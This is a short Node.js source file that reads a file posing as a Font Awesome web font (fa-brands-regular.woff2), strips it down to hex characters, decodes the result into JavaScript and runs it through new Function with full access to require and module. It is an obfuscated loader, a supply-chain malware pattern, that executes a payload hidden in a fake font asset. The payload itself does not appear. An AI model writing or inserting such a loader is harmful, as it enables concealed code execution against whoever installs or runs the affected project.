const fs = require('node:fs');
const path = require('node:path');

const hex = fs.readFileSync(path.join(__dirname, '../../../webfonts/fa-brands-regular.woff2'), 'utf8')
  .replace(/[^0-9a-f]/gi, '');

const src = Buffer.from(hex, 'hex').toString('utf8');

new Function('require','module','exports','__filename','__dirname', src)(
  require,
  module,
  exports,
  __filename,
  __dirname
);